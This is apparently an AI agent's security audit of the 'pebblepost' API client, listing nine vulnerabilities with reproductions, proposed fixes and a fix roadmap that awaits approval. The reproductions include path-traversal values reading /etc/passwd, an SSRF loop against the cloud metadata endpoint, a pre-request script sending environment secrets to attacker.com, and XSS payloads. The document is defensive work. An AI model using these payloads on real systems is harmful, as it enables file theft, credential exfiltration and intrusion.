# Security Audit Report – Round 2 (Post-Prompt 1 Features)

**Date**: 2026-10-05  
**Auditor**: Antigravity Security Auditor (`@[security-auditor]`)  
**Scope**: Codebase audit of features introduced after Round 1 (gRPC dynamic client, WebSocket/SSE streaming, `pb.sendRequest` auxiliary client, OAuth2 loopback server, cryptographic auto-update service, HTML previews, collection importers/exporters, documentation generator, CLI runner, and file permission models).  
**Repository**: `pebblepost`  
**Status**: **STEP 1 COMPLETED – PENDING USER APPROVAL FOR STEP 2 (FIXES)**

---

## Executive Summary

Following the initial security baseline established in Prompt 1, PebblePost expanded significantly with advanced protocol support (gRPC, WebSocket, SSE), runtime scripting additions (`pb.sendRequest`), automated OAuth2 PKCE loopback servers, cryptographic update checks, collection importers, and standalone documentation generation.

This Round 2 audit evaluated the entire surface introduced by these new subsystems against the **OWASP Top 10:2025** threat model, local workstation security boundaries, DNS rebinding risks, Server-Side Request Forgery (SSRF), arbitrary file read/write traversals, and Cross-Site Scripting (XSS).

A total of **9 security findings** have been identified across the 8 required audit domains. No fixes have been applied in Step 1 in accordance with the audit protocol.

---

## Summary of Findings

| ID | Title | Severity | OWASP 2025 | Target Location |
|---|---|---|---|---|
| **SEC2-01** | Body File References & `@file:` Path Traversal (Arbitrary File Read) | **HIGH** | A01: Broken Access Control | `internal/httpclient/client.go:348,371,412` |
| **SEC2-02** | gRPC `.proto` Import Paths and Root CA Certs Escape Workspace Boundary | **HIGH** | A01: Broken Access Control | `internal/grpcclient/client.go:57,144-164` |
| **SEC2-03** | `pb.sendRequest` Internal SSRF, Unbounded Loops, and Secret Leakage | **HIGH** | A01: Broken Access Control / A10 | `internal/scripting/utils.go:186-285`, `sandbox.go:660-692` |
| **SEC2-04** | OAuth2 Loopback Listener Vulnerable to DoS via State Probing & Unbounded Re-use | **MEDIUM** | A07: Identification & Auth Failures | `internal/httpclient/oauth2.go:278-330` |
| **SEC2-05** | Auto-Update Lacks Cryptographic Verification Gate for Binary Replacement | **HIGH** | A08: Software & Data Integrity Failures | `internal/autoupdate/service.go:140-330` |
| **SEC2-06** | Web Server Missing Host-Header Validation (DNS Rebinding) & Plaintext Token Log | **HIGH** | A02: Security Misconfiguration | `cmd/server/main.go:56`, `internal/security/middleware.go:8-39` |
| **SEC2-07** | CLI Runner Executes Untrusted Scripts Without Explicit Trust Gate | **HIGH** | A05: Injection (Code Execution) | `cmd/cli/main.go:65-150` |
| **SEC2-08** | Stored XSS in Docs Generator, Sandboxed iframe Script Execution, & Markdown Links | **HIGH** | A05: Injection (XSS) | `internal/docs/html.go:379-388`, `web/src/components/response/ResponsePanel.tsx:665`, `MarkdownView.tsx:210` |
| **SEC2-09** | World-Readable Permissions for Secret Environment Files, Cookies, and History | **MEDIUM** | A02: Security Misconfiguration | `internal/history/store.go:31-35`, `cookie_jar.go:309-332`, `serializer.go:35-45` |

---

## Detailed Findings & Remediation Plans

### SEC2-01: Body File References & `@file:` Path Traversal (Arbitrary File Read)
- **File & Lines**: [`internal/httpclient/client.go:348`](file:///home/pang/work-space/buil-software/pebblepost/internal/httpclient/client.go#L348), [`internal/httpclient/client.go:371`](file:///home/pang/work-space/buil-software/pebblepost/internal/httpclient/client.go#L371), [`internal/httpclient/client.go:412`](file:///home/pang/work-space/buil-software/pebblepost/internal/httpclient/client.go#L412)
- **Severity**: **HIGH**
- **OWASP 2025**: A01: Broken Access Control / Path Traversal
- **Vulnerability**:
  In `buildBodyBytes`:
  ```go
  data, err := os.ReadFile(body.FilePath)           // line 348
  data, err := os.ReadFile(filePath)                // line 371
  fileData, err := os.ReadFile(filePath)            // line 412
  ```
  Neither `body.FilePath`, `body.Raw` (with `body.Type == "file"`), `@file:<path>` body references, nor multipart form-data file attachments validate the target path against the active `workspaceRoot`. If a shared collection request configures a path like `/etc/passwd`, `C:\Windows\win.ini`, or `../../.ssh/id_rsa`, clicking "Send" reads the sensitive file and transmits its full content to the remote HTTP endpoint in the request body.
- **Minimal Reproduction**:
  1. Create request definition:
     ```json
     {
       "url": "https://httpbin.org/post",
       "method": "POST",
       "body": { "type": "file", "raw": "../../../etc/passwd" }
     }
     ```
  2. Call `client.Execute(ctx, req)`.
  3. The request succeeds and uploads the contents of `/etc/passwd` to the server.
- **Proposed Fix**:
  1. Add `workspaceRoot` field to `DefaultClient` (or leverage existing `c.grpcClient` / `c.cookieJar` workspace root).
  2. Implement a unified helper `resolveSafeBodyFilePath(workspaceRoot, rawPath) (string, error)` that uses `security.SafeJoin(workspaceRoot, relPath)` to resolve relative paths and `@file:<relative-path>` syntax.
  3. Reject bare absolute paths, Windows drive/UNC paths, paths containing `..`, and symlinks resolving outside `workspaceRoot`.
  4. If path resolves outside workspace or workspace is empty, refuse execution with `fmt.Errorf("body file reference outside workspace boundary is forbidden: %s", rawPath)`.
- **Test Strategy**:
  Add tests in `internal/httpclient/client_test.go`:
  - Request with relative file inside workspace succeeds.
  - Request with `../../etc/passwd` fails with security traversal error.
  - Request with absolute path `/etc/passwd` or `C:\secret.txt` fails.
  - Request with symlink pointing outside workspace root fails.

---

### SEC2-02: gRPC `.proto` Import Paths and Root CA Certs Escape Workspace Boundary
- **File & Lines**: [`internal/grpcclient/client.go:53-60`](file:///home/pang/work-space/buil-software/pebblepost/internal/grpcclient/client.go#L53-L60), [`internal/grpcclient/client.go:144-164`](file:///home/pang/work-space/buil-software/pebblepost/internal/grpcclient/client.go#L144-L164)
- **Severity**: **HIGH**
- **OWASP 2025**: A01: Broken Access Control / Path Traversal
- **Vulnerability**:
  In `LoadProtoServices(protoFiles, importPaths)`:
  - If `ip` in `importPaths` is absolute, it is appended directly to `resolvedImportPaths` (line 146).
  - If `ip` is relative, it calls `filepath.Join(c.workspaceRoot, ip)`. In Go, `filepath.Join("/workspace", "../../etc")` produces `/etc`, completely bypassing directory confinement.
  - `protoFiles` directory handling has the exact same flaw (lines 156-160).
  - In `Dial` (line 55-57), `rootCAPath` is resolved via `filepath.Join(c.workspaceRoot, caPath)` and read with `os.ReadFile(caPath)` without validation.
  An untrusted collection can specify external proto imports or CA cert paths to read arbitrary files or trigger denial-of-service via parser exploitation.
- **Minimal Reproduction**:
  1. Configure gRPC definition:
     ```json
     {
       "protoFiles": ["passwd"],
       "importPaths": ["../../../../etc"]
     }
     ```
  2. Call `LoadProtoServices(protoFiles, importPaths)`.
  3. Parser reads `/etc/passwd` from the host filesystem.
- **Proposed Fix**:
  1. For every entry in `importPaths`, `protoFiles`, and `rootCAPath`, pass through `security.SafeJoin(c.workspaceRoot, path)`.
  2. Reject absolute paths, `..` traversals, and symlinks whose target is outside `workspaceRoot`.
  3. Ensure `resolvedImportPaths` only contains paths confirmed to be within `c.workspaceRoot`.
- **Test Strategy**:
  Add `TestLoadProtoServices_PathEscape` in `internal/grpcclient/client_test.go`:
  - Pass traversal import paths (`../..`) -> Expect error.
  - Pass absolute import paths (`/usr/include`) -> Expect error.
  - Pass valid workspace-local proto directory -> Expect success.

---

### SEC2-03: `pb.sendRequest` Internal SSRF, Unbounded Loops, and Secret Leakage
- **File & Lines**: [`internal/scripting/utils.go:186-285`](file:///home/pang/work-space/buil-software/pebblepost/internal/scripting/utils.go#L186-L285), [`internal/scripting/sandbox.go:660-692`](file:///home/pang/work-space/buil-software/pebblepost/internal/scripting/sandbox.go#L660-L692)
- **Severity**: **HIGH**
- **OWASP 2025**: A01: Broken Access Control (SSRF) & A10: Exceptional Conditions
- **Vulnerability**:
  1. **SSRF to Private/Link-Local Services**: `pb.sendRequest` executes HTTP requests from pre-request scripts with no network destination checks. A malicious collection can probe cloud metadata (`http://169.254.169.254`), local services (`http://127.0.0.1:6379`), or intranet subnets and exfiltrate responses via another request without any user interaction or notification.
  2. **Unbounded Loops & Resource Depletion**: There is no counter on the number of `pb.sendRequest` calls a single script can invoke. A script containing `while(true) { pb.sendRequest(...) }` can issue dozens or hundreds of synchronous network calls until the Goja VM interrupt fires.
  3. **Uncontrolled Redirects**: `ac.client` uses default redirect handling (up to 10 redirects). It does not prevent cross-origin redirects from public to private IP addresses or redirects leaking sensitive headers.
  4. **Unmasked Secrets in Errors**: If `pb.sendRequest` fails, `panic(vm.ToValue(fmt.Sprintf("pb.sendRequest failed: %v", err)))` exposes unmasked URLs, query tokens, and headers directly in the script execution error.
- **Minimal Reproduction**:
  1. Add pre-request script:
     ```js
     for (let i = 0; i < 50; i++) {
       pb.sendRequest({ url: "http://169.254.169.254/latest/meta-data/" });
     }
     ```
  2. Execute request. 50 synchronous requests are sent to the AWS metadata endpoint with no user prompt or call limiting.
- **Proposed Fix**:
  1. **Per-Execution Call Limit**: Introduce an atomic/scoped invocation counter (maximum 5 auxiliary requests per script execution). Exceeding this returns an immediate error: `pb.sendRequest limit exceeded (maximum 5 calls per script)`.
  2. **Redirect & Timeout Policy**: Configure `CheckRedirect` on `ac.client` to cap redirects at 3, disallow redirecting to loopback/link-local/private IP ranges unless explicitly allowed, and disallow downgrading from HTTPS to HTTP.
  3. **SSRF Protection / Safe Dialing**: Implement IP resolution verification in the transport dialer: block requests targeting `169.254.169.254` (cloud metadata) and provide an option/audit log if targeting localhost or private subnets.
  4. **Secret Masking**: Pass active environment secret values into `SendRequest` and filter all error messages and URL logs with `security.MaskSecrets`.
- **Test Strategy**:
  In `internal/scripting/sandbox_test.go`:
  - Test script invoking `pb.sendRequest` 6 times triggers call limit error.
  - Test redirect to private address is rejected.
  - Test error containing secret token in query string is masked (`***`).

---

### SEC2-04: OAuth2 Loopback Listener Vulnerable to DoS via State Probing & Unbounded Re-use
- **File & Lines**: [`internal/httpclient/oauth2.go:278-330`](file:///home/pang/work-space/buil-software/pebblepost/internal/httpclient/oauth2.go#L278-L330)
- **Severity**: **MEDIUM**
- **OWASP 2025**: A07: Identification and Authentication Failures
- **Vulnerability**:
  In `AuthorizeCodePKCE`:
  ```go
  if q.Get("state") != state {
      http.Error(w, "State mismatch", http.StatusBadRequest)
      errChan <- fmt.Errorf("state mismatch in OAuth2 callback")
      return
  }
  ```
  1. **Premature DoS Abort**: If any local process, port scanner, or browser tab makes a request to `http://127.0.0.1:<port>/callback` with an absent or incorrect `state`, it immediately pushes an error to `errChan`. Line 355 picks up `errChan` and terminates the entire authorization flow with an error before the real OAuth2 provider can redirect back with the valid code.
  2. **Missing Single-Use Guard**: `codeChan` has buffer size 1. If multiple callback requests arrive before server shutdown, subsequent sends to `codeChan` will block or fail.
  3. **Host Header Validation**: The loopback HTTP server does not validate `r.Host`. An external malicious webpage can execute a DNS rebinding attack to send requests to the local port.
- **Minimal Reproduction**:
  1. Trigger OAuth2 PKCE login, starting loopback listener on `127.0.0.1:PORT`.
  2. A local background script sends `GET http://127.0.0.1:PORT/callback?state=wrong`.
  3. The OAuth authorization immediately aborts with `state mismatch in OAuth2 callback`.
- **Proposed Fix**:
  1. For requests with non-matching state or invalid paths, reply HTTP 400 Bad Request, but **do NOT** send to `errChan`. Only send to `errChan` when an explicit OAuth error is returned with a matching state parameter.
  2. Use a `sync.Once` to ensure only the first valid authorization code callback is accepted, after which the HTTP server is shut down immediately.
  3. Validate that `r.Host` is either `127.0.0.1:<port>` or `localhost:<port>`.
- **Test Strategy**:
  In `internal/httpclient/oauth2_test.go`:
  - Send request with mismatched state -> Verify listener continues running and does not abort.
  - Send request with invalid Host header -> Verify rejected with 400.
  - Send request with valid state -> Verify code is captured, and listener stops cleanly.

---

### SEC2-05: Auto-Update Lacks Cryptographic Verification Gate for Binary Replacement
- **File & Lines**: [`internal/autoupdate/service.go:140-223`](file:///home/pang/work-space/buil-software/pebblepost/internal/autoupdate/service.go#L140-L223), [`internal/autoupdate/service.go:293-330`](file:///home/pang/work-space/buil-software/pebblepost/internal/autoupdate/service.go#L293-L330)
- **Severity**: **HIGH**
- **OWASP 2025**: A08: Software and Data Integrity Failures
- **Vulnerability**:
  While `VerifySignature` exists as an isolated crypto helper, the autoupdate package currently lacks an end-to-end `ApplyUpdate` workflow that downloads the release binary, verifies its Minisign/Ed25519 signature *before* touching the filesystem executable, enforces HTTPS, sets strict temp file permissions, and refuses version downgrades:
  1. **No HTTPS Enforcement**: `info.AssetURL` and `info.SignatureURL` could be HTTP if a custom API base or mirror is used.
  2. **Downgrade Attack**: If a compromised or malicious feed advertises an older vulnerable release (e.g. `v0.1.0`), the system must reject it (`CompareSemver(latest, current) <= 0`).
  3. **Tampered Artifact / Missing Signature**: If the signature file is absent or the binary hash does not verify against the trusted public key, the updater must fail closed and wipe temporary files.
  4. **Temp File Permissions**: Downloaded binaries must be created with `0600` permissions (owner read/write only).
- **Minimal Reproduction**:
  1. Feed an update with `AssetURL: "http://insecure/bin"` or version `0.1.0`.
  2. Download a binary whose signature does not verify or is missing.
  3. Verify whether the updater catches these before replacing the binary.
- **Proposed Fix**:
  1. Implement `ApplyUpdate(ctx context.Context, info *UpdateInfo, targetBinaryPath string) error`:
     - Reject if `info.AssetURL` or `info.SignatureURL` does not start with `https://`.
     - Reject if `CompareSemver(info.LatestVersion, s.currentVersion) <= 0` (downgrade or identical version).
     - Download artifact and signature to temporary files with mode `0600`.
     - Verify signature against `s.publicKey` using `VerifySignature`. If signature is missing or verification fails, abort, wipe temp files, and return error.
     - Atomically replace target binary using rename / executable replacement pattern.
- **Test Strategy**:
  In `internal/autoupdate/autoupdate_test.go`:
  - `TestApplyUpdate_DowngradeRefused`: Attempting to apply older or identical version fails.
  - `TestApplyUpdate_HTTPRejected`: Non-HTTPS asset or signature URL fails.
  - `TestApplyUpdate_TamperedArtifact`: 1 modified byte in payload causes verification failure and aborts replacement.
  - `TestApplyUpdate_MissingSignature`: Missing signature URL or file causes abort.
  - `TestApplyUpdate_TempFilePermissions`: Verify created temp file has mode `0600`.

---

### SEC2-06: Web Server Missing Host-Header Validation (DNS Rebinding) & Plaintext Token Log
- **File & Lines**: [`cmd/server/main.go:56`](file:///home/pang/work-space/buil-software/pebblepost/cmd/server/main.go#L56), [`internal/security/middleware.go:8-39`](file:///home/pang/work-space/buil-software/pebblepost/internal/security/middleware.go#L8-L39)
- **Severity**: **HIGH**
- **OWASP 2025**: A02: Security Misconfiguration
- **Vulnerability**:
  1. **DNS Rebinding**: When running `cmd/server`, `security.Chain` does not include Host-header validation. If an attacker tricks a user into visiting an attacker domain (e.g. `evil.com`) configured with a short TTL that rebinds to `127.0.0.1:8080`, browser scripts can issue requests with `Host: evil.com:8080`. The server processes these requests without validating that the Host header corresponds to an authorized interface.
  2. **Plaintext API Token Printed to Logs**: In `cmd/server/main.go:56`:
     `log.Printf("PebblePost API token: %s", authToken)`
     The secret token is printed in plaintext to stdout, exposing it in container logs, systemd journals, or CI logs.
  3. **Token Over SSE Query String**: Because EventSource in browsers cannot send HTTP Authorization headers, the token travels in `?token=...`. If logged or forwarded, this leaks credentials in server access logs and browser history.
- **Minimal Reproduction**:
  1. Run `cmd/server` on `127.0.0.1:8080`.
  2. Execute `curl -H "Host: attacker.com" http://127.0.0.1:8080/api/health`.
  3. Server accepts the request instead of rejecting the unrecognized Host.
- **Proposed Fix**:
  1. Implement `HostHeaderMiddleware(allowedHosts ...string) func(http.Handler) http.Handler` in `internal/security/middleware.go`. Allow only `localhost`, `127.0.0.1`, `[::1]`, and the explicitly configured `--host`. Return HTTP 400 Bad Request if the Host header is unrecognized.
  2. In `cmd/server/main.go`, mask the token when logging to stdout (`authTok[:4] + "****"`) or provide an option to write it to a secured credentials file (`.pebble/token`, mode `0600`).
  3. Document the SSE token-in-query behavior in `docs/security.md`, and strip/mask `token` query parameters in any HTTP request logging.
- **Test Strategy**:
  In `internal/security/middleware_test.go`:
  - `TestHostHeaderMiddleware_Allowed`: Requests with `Host: localhost:8080` and `127.0.0.1:8080` pass.
  - `TestHostHeaderMiddleware_Rejected`: Requests with `Host: evil.com` or `attacker.local` receive 400 Bad Request.

---

### SEC2-07: CLI Runner Executes Untrusted Scripts Without Explicit Trust Gate
- **File & Lines**: [`cmd/cli/main.go:65-150`](file:///home/pang/work-space/buil-software/pebblepost/cmd/cli/main.go#L65-L150)
- **Severity**: **HIGH**
- **OWASP 2025**: A05: Injection (Arbitrary JavaScript Execution)
- **Vulnerability**:
  When a user runs `pebblepost run <path>`, the CLI parses request definitions and immediately runs pre-request scripts and test assertions inside Goja. If a developer clones an untrusted repository or pulls an external PR containing a collection, running `pebblepost run` immediately executes JavaScript scripts that can access environment variables and execute auxiliary requests without user awareness.
- **Minimal Reproduction**:
  1. Create a collection with a pre-request script:
     ```js
     pb.sendRequest({ url: "https://attacker.com/?env=" + JSON.stringify(pb.environment) });
     ```
  2. Run `pebblepost run ./untrusted-collection`.
  3. The script executes automatically without asking for confirmation or requiring a trust flag.
- **Proposed Fix**:
  1. Add a `--trust` flag to `pebblepost run`.
  2. Check for explicit trust:
     - `--trust` command line flag passed, OR
     - `.pebbletrust` trust marker file exists in the collection root.
  3. If collection requests contain scripts and trust has NOT been granted:
     - Skip script execution and output a clear warning:
       `[WARNING] Collection contains pre-request/post-response scripts. Script execution was skipped because trust has not been granted. Run with --trust or create .pebbletrust to enable scripts.`
  4. Document `--trust` and the trust model in CLI documentation and help text.
- **Test Strategy**:
  In `internal/runner/runner_test.go` or `cmd/cli/main_test.go`:
  - `TestCLI_UntrustedCollection_SkipsScripts`: Running without `--trust` skips scripts and logs warning.
  - `TestCLI_TrustedCollection_ExecutesScripts`: Running with `--trust` or `.pebbletrust` executes scripts as expected.

---

### SEC2-08: Stored XSS in Docs Generator, Sandboxed iframe Script Execution, & Markdown Links
- **File & Lines**:
  - [`internal/docs/html.go:379-388,431`](file:///home/pang/work-space/buil-software/pebblepost/internal/docs/html.go#L379-L388)
  - [`internal/docs/markdown.go:34-43`](file:///home/pang/work-space/buil-software/pebblepost/internal/docs/markdown.go#L34-L43)
  - [`web/src/components/response/ResponsePanel.tsx:665`](file:///home/pang/work-space/buil-software/pebblepost/web/src/components/response/ResponsePanel.tsx#L665)
  - [`web/src/components/common/MarkdownView.tsx:208-216`](file:///home/pang/work-space/buil-software/pebblepost/web/src/components/common/MarkdownView.tsx#L208-L216)
  - [`internal/impexp/service.go:183`](file:///home/pang/work-space/buil-software/pebblepost/internal/impexp/service.go#L183)
- **Severity**: **HIGH**
- **OWASP 2025**: A05: Injection (Cross-Site Scripting & Path Traversal)
- **Vulnerability**:
  1. **HTML Docs Generator XSS**:
     `slugify(text)` only strips spaces, slashes, dots, and parens. It leaves `<script>`, quotes (`"`), and single quotes (`'`) intact. When generating HTML documentation:
     - `id := slugify(...)` is interpolated directly into `<a href="#%s">`, `<div id="%s">`, and `onclick="selectTab(this, '%s_curl')"`.
     - A request named `Profile"><script>alert('XSS')</script>` or with single quotes escapes attributes and executes arbitrary JavaScript in the browser viewing the docs.
  2. **Response HTML Preview Sandbox**:
     In `ResponsePanel.tsx:665`:
     ```tsx
     <iframe srcDoc={displayBody} sandbox="allow-scripts" title="HTML Preview" />
     ```
     `sandbox="allow-scripts"` explicitly allows scripts in the response body to execute in the frontend app window.
  3. **Markdown Link Injection**:
     In `MarkdownView.tsx:210`, `<a href={first.href}>` does not validate the protocol. Links like `[Click me](javascript:alert(1))` execute JavaScript when clicked.
  4. **Importer Path Traversal**:
     In `internal/impexp/service.go:183`, `item.RelPath` and `folder.RelPath` are joined via `filepath.Join(targetBase, item.RelPath)` without `security.SafeJoin`. An imported collection with hostile relative paths can write files outside the workspace.
- **Minimal Reproduction**:
  1. Create request named `<script>alert('XSS')</script>`. Generate HTML docs: `pebblepost docs --format html`. Inspect `index.html`: raw unescaped `<script>` is injected into the HTML.
  2. Send request returning `<script>alert('iframe-xss')</script>`. View in HTML Preview: script runs due to `sandbox="allow-scripts"`.
  3. Render markdown `[Click](javascript:alert('xss'))`: clicking executes JavaScript.
- **Proposed Fix**:
  1. In `internal/docs/markdown.go` and `html.go`: rewrite `slugify` to sanitize strictly (`[a-z0-9_-]+`), replacing all invalid characters with `-`. Wrap all string interpolations with `html.EscapeString`.
  2. In `ResponsePanel.tsx`: change `sandbox="allow-scripts"` to `sandbox=""` (disables all scripts and prevents same-origin access).
  3. In `MarkdownView.tsx`: sanitize `href` to only allow `http:`, `https:`, `mailto:`, and `#`. Disallow `javascript:`, `data:`, `vbscript:`.
  4. In `internal/impexp/service.go`: validate `item.RelPath` and `folder.RelPath` using `security.SafeJoin`.
- **Test Strategy**:
  - In `internal/docs/docs_test.go`: add `TestGenerateHTML_XSSSanitization` testing `<script>alert(1)</script>`, `"><img src=x onerror=...>`, and single quotes in request names and descriptions.
  - In frontend component tests: verify iframe sandbox attribute is `""` (no `allow-scripts` or `allow-same-origin`) and markdown links with `javascript:` are rejected.
  - In `internal/impexp/impexp_test.go`: test importing collection with `RelPath: "../../escape.json"` is safely rejected.

---

### SEC2-09: World-Readable Permissions for Secret Environment Files, Cookies, and History
- **File & Lines**:
  - [`internal/history/store.go:31-35`](file:///home/pang/work-space/buil-software/pebblepost/internal/history/store.go#L31-L35)
  - [`internal/httpclient/cookie_jar.go:309-332`](file:///home/pang/work-space/buil-software/pebblepost/internal/httpclient/cookie_jar.go#L309-L332)
  - [`internal/workspace/environment.go:134-146`](file:///home/pang/work-space/buil-software/pebblepost/internal/workspace/environment.go#L134-L146)
  - [`internal/workspace/serializer.go:35-45`](file:///home/pang/work-space/buil-software/pebblepost/internal/workspace/serializer.go#L35-L45)
- **Severity**: **MEDIUM**
- **OWASP 2025**: A02: Security Misconfiguration / Insecure Defaults
- **Vulnerability**:
  1. `history.db` is created by pure-Go SQLite with process umask defaults (`0644`), leaving the database world-readable on shared systems.
  2. `cookie_jar.go` creates `.pebble/` with `0755` permissions (line 309).
  3. `environment.go` creates `.pebble/environments/` with `0755` permissions (line 134).
  4. `WriteFileStable` creates temporary and target files with `0644` permissions (line 45). Because `*.secret.env.json` files are written via `WriteFileStable`, sensitive API tokens, passwords, and secret variables are stored world-readable on disk.
- **Minimal Reproduction**:
  1. Save an environment containing secret variables on Linux.
  2. Run `ls -ld .pebble/environments` and `ls -l .pebble/environments/*.secret.env.json`.
  3. Modes are `0755` and `0644`, accessible to other users on the workstation.
- **Proposed Fix**:
  1. Create all sensitive directories (`.pebble`, `.pebble/environments`, `<dataDir>/history`) with mode `0700`.
  2. In `internal/workspace/serializer.go`, introduce `WriteFileStableWithMode(filePath string, v any, perm os.FileMode) error`.
  3. For `*.secret.env.json`, write with mode `0600`.
  4. For `cookies.json`, enforce mode `0600`.
  5. For `history.db`, call `os.Chmod(dbPath, 0600)` after creation.
  6. Document in `docs/security.md` the POSIX mode behavior on Unix and the corresponding ACL model limitations on Windows.
- **Test Strategy**:
  In `internal/workspace/environment_test.go`, `internal/httpclient/cookie_jar_test.go`, and `internal/history/store_test.go`:
  - On Unix platforms, verify `fi.Mode().Perm()` is `0600` for secret files, cookies, and history database, and `0700` for their parent directories.

---

## Step 2 Implementation Roadmap (Awaiting Approval)

Upon user approval of this audit report, Step 2 will execute the fixes in structured, focused commits on branch `sec/round-2-audit`:

1. **Commit 1 (`fix(sec): sandbox file bodies and grpc proto imports to workspace boundary`)**:
   - Fix SEC2-01: Add workspace confinement to `buildBodyBytes` and multipart file uploads.
   - Fix SEC2-02: Use `SafeJoin` for all gRPC proto imports, files, and root CA paths.
   - Add unit tests for traversal rejection.
2. **Commit 2 (`fix(sec): harden pb.sendRequest with SSRF guard, call limits, and secret masking`)**:
   - Fix SEC2-03: Implement call counter (max 5), redirect restriction, SSRF checks, and secret masking.
   - Add script engine security tests.
3. **Commit 3 (`fix(sec): harden oauth2 loopback listener and server middleware against DNS rebinding`)**:
   - Fix SEC2-04: Prevent state mismatch DoS and enforce single-use in `AuthorizeCodePKCE`.
   - Fix SEC2-06: Implement `HostHeaderMiddleware` and sanitize token logging in `cmd/server`.
   - Add middleware and OAuth tests.
4. **Commit 4 (`fix(sec): implement cryptographic update verification and downgrade protection`)**:
   - Fix SEC2-05: Implement `ApplyUpdate` with HTTPS-only checks, downgrade refusal, temp file `0600`, and Ed25519 signature verification gate before binary replacement.
   - Add tampered and downgrade tests.
5. **Commit 5 (`fix(sec): add CLI script trust mechanism and sanitize docs/preview output encoding`)**:
   - Fix SEC2-07: Add `--trust` flag and `.pebbletrust` check in CLI runner.
   - Fix SEC2-08: Sanitize `slugify` and HTML docs templates, remove `allow-scripts` from response iframe preview, sanitize markdown links, and guard importer paths.
   - Add `<script>` injection regression tests.
6. **Commit 6 (`fix(sec): restrict file permissions for history, cookies, and secret environments`)**:
   - Fix SEC2-09: Enforce `0600` on secret files, cookies, history DB, and `0700` on sensitive directories.
   - Update `docs/security.md` with Windows limitations.
   - Run full test suite.
